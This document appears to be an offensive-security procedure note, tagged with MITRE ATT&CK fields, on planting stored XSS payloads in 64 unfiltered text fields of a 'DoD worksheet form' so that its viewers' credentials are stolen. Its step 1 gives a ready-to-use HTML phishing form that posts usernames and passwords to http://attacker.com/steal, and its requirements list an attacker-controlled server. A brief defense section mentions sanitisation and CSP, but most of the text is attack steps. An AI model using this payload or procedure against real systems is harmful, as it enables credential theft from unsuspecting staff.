---
id: proc-uuid-003
tags:
  - payload-injection
  - stored-xss
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:36.859Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payloads-into-Vulnerable-Fields

## Summary

This procedure details injecting malicious JavaScript payloads into the 64 vulnerable text fields of the DoD worksheet form to store exploitable XSS code server-side, targeting credential theft upon viewing.

## Description

Once vulnerabilities are confirmed, this step involves crafting and inserting payloads like phishing forms or exfiltration scripts into every text field. The form's lack of filtering allows HTML and <script> tags to persist. In an attack scenario, this stores the payload for later execution by victims (e.g., legal staff). Prerequisites: Form access and payload knowledge; outcomes: Worksheet ready for submission with embedded malice.

## Requirements

1. Identified list of 64 vulnerable fields
2. Attacker-controlled server for data reception (e.g., http://attacker.com)
3. Crafted payloads for specific impacts (phishing, cookie theft)

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs using libraries like DOMPurify or OWASP ESAPI
- Strip or escape special characters (<, >, ", ') in text fields
- Implement content security policy (CSP) to block inline scripts

## Objectives

1. Embed functional XSS payloads across all exploitable fields
2. Ensure payloads target high-impact actions like credential capture
3. Maintain form validity to avoid submission blocks

## Instructions

### Step 1: Prepare Payloads

**Context**: Select payloads for injection.

Use phishing: <h3>Please login to proceed</h3><form action="http://attacker.com/steal">Username:<br><input type="text" name="username"><br>Password:<br><input type="password" name="password"><br><input type="submit" value="Logon"></form>

> Tailor for theft. Expected output: Valid HTML/JS snippet.

### Step 2: Inject into Fields

**Context**: Fill the form systematically.

Paste payloads into each of the 64 text fields.

> Cover all areas. Expected output: Form populated; preview shows raw code.

### Step 3: Validate Persistence

**Context**: Check for immediate issues.

Review form before submit.

> No errors. Expected output: Payloads intact.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[injection]]
- [[payload]]
